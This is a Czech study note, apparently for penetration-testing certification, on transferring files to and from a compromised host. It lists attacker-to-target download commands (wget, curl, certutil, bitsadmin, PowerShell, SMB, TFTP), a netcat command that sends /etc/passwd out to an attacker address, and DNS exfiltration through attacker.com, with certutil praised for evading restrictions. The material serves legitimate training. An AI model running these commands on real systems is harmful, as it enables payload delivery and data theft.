# 💻 File Transfer With Code – Doplnění

## 1. Python – kontrola dostupnosti

Než použiješ Python transfer, zjisti verzi:

```
python --version
python2 --version
python3 --version
```

Časté situace:

|Systém|Dostupnost|
|---|---|
|Starý Linux|Python 2|
|Moderní Linux|Python 3|
|Minimal systémy|Python není|

---

# 2. Python HTTP Server (nejčastější CPTS metoda)

Na útočníkovi:

```
python3 -m http.server 8000
```

Na cíli:

### Linux

```
wget http://10.10.10.10/file -O /tmp/file
```

nebo:

```
curl http://10.10.10.10/file -o /tmp/file
```

### Windows

```
iwr http://10.10.10.10/file.exe -OutFile file.exe
```

---

# 3. Netcat Transfer (když není HTTP)

Netcat je často dostupný i na minimálních systémech.

## Download souboru na cíl

Útočník:

```
nc -lvnp 4444 < file.txt
```

Cíl:

```
nc 10.10.10.10 4444 > file.txt
```

---

## Upload souboru z cíle

Útočník:

```
nc -lvnp 4444 > loot.txt
```

Cíl:

```
nc 10.10.10.10 4444 < /etc/passwd
```

---

# 4. Certutil (Windows Living Off The Land)

Velmi časté v HTB.

## Download:

```
certutil.exe -urlcache -split -f http://10.10.10.10/file.exe file.exe
```

Výhody:

- vestavěné ve Windows
- často obejde omezení
- nemusíš nahrávat vlastní downloader

---

# 5. Bitsadmin (Windows)

Starší, ale stále užitečné:

```
bitsadmin /transfer job /download /priority normal http://10.10.10.10/file.exe C:\Temp\file.exe
```

---

# 6. PowerShell Download Variace

## Invoke-WebRequest

```
Invoke-WebRequest http://10.10.10.10/file.exe -OutFile file.exe
```

zkratka:

```
iwr http://10.10.10.10/file.exe -OutFile file.exe
```

---

## WebClient

```
(New-Object Net.WebClient).DownloadFile(
"http://10.10.10.10/file.exe",
"C:\Temp\file.exe")
```

---

# 7. SMB Transfer

Velmi důležité pro Windows domény.

Útočník:

```
impacket-smbserver share /tmp/share -smb2support
```

Windows:

```
copy \\10.10.10.10\share\file.exe .
```

---

## Přihlášení k SMB share:

```
net use \\10.10.10.10\share /user:test Password123
```

---

# 8. TFTP (staré systémy)

UDP 69.

Download:

```
tftp -i 10.10.10.10 GET file.exe
```

Často:

- routery
- IoT
- staré Windows

---

# 9. DNS Exfiltrace (když je firewall)

Pokud jsou blokované HTTP/SMB:

Data lze posílat přes DNS dotazy.

Příklad koncept:

```
secret.txt
 ↓
base64
 ↓
abc123.attacker.com
 ↓
DNS query
```

Nástroje:

- dnscat2
- iodine

---

# 10. Transfer Checklist (CPTS)

## Linux

```
[ ] wget
[ ] curl
[ ] python
[ ] php
[ ] ruby
[ ] perl
[ ] nc
[ ] scp
[ ] rsync
```

## Windows

```
[ ] PowerShell
[ ] certutil
[ ] bitsadmin
[ ] curl
[ ] wget
[ ] SMB
[ ] FTP
[ ] WebDAV
```

---

# Rozhodovací strom

```
Mám shell
     |
     |
     +-- Python?
     |       |
     |       +-- python3 -m http.server
     |
     +-- wget/curl?
     |       |
     |       +-- HTTP download
     |
     +-- Windows?
     |       |
     |       +-- certutil
     |       +-- PowerShell
     |
     +-- SMB dostupné?
     |       |
     |       +-- impacket-smbserver
     |
     +-- Nic?
             |
             +-- Base64
             +-- Netcat
```